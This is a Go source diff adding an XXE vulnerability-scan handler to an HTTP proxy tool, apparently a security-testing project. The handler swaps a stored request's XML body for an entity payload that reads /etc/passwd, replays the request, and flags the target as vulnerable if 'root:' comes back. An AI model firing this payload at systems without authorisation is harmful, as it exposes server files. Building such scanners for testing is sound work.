@@ -6,6 +6,7 @@ import (
 	"github.com/gorilla/mux"
 	"net/http"
 	"strconv"
+	"strings"
 )
 
 type Handlers struct {
@@ -77,20 +78,48 @@ func (h *Handlers) RepeatRequest(w http.ResponseWriter, r *http.Request) {
 	delivery.Send(w, http.StatusOK, resp)
 }
 
-var xxe = "<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n"
+var (
+	xxe                 = "<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n"
+	xml                 = "<?xml"
+	target              = "root:"
+	requestIsVulnerable = "request is vulnerable!!!😈"
+)
 
 func (h *Handlers) VulnerabilityScan(w http.ResponseWriter, r *http.Request) {
-	//id, err := strconv.Atoi(mux.Vars(r)["id"])
-	//if err != nil {
-	//	delivery.SendError(w, http.StatusNotFound, "")
-	//	return
-	//}
-	//
-	//reqDB, err := h.Repo.GetRequest(id)
-	//if err != nil {
-	//	delivery.SendError(w, http.StatusNotFound, err.Error())
-	//	return
-	//}
-	//
-	//reqDB
+	id, err := strconv.Atoi(mux.Vars(r)["id"])
+	if err != nil {
+		delivery.SendError(w, http.StatusNotFound, "")
+		return
+	}
+
+	reqDB, err := h.Repo.GetRequest(id)
+	if err != nil {
+		delivery.SendError(w, http.StatusNotFound, err.Error())
+		return
+	}
+
+	if ind := strings.Index(reqDB.Body, xml); ind != -1 {
+		reqDB.Body = reqDB.Body[:ind] + xxe
+	}
+	body := bytes.NewBufferString(reqDB.Body)
+
+	urlStr := reqDB.Scheme + "://" + reqDB.Host + reqDB.Path
+	req, err := http.NewRequest(reqDB.Method, urlStr, body)
+	if err != nil {
+		delivery.SendError(w, http.StatusOK, err.Error())
+		return
+	}
+
+	for key, value := range reqDB.Header {
+		req.Header.Add(key, value)
+	}
+
+	resp := h.Proxy.ProxyHTTP(req)
+
+	if ind := strings.Index(resp.Body, target); ind != -1 {
+		delivery.Send(w, http.StatusOK, requestIsVulnerable)
+		return
+	}
+
+	delivery.Send(w, http.StatusOK, resp)
 }
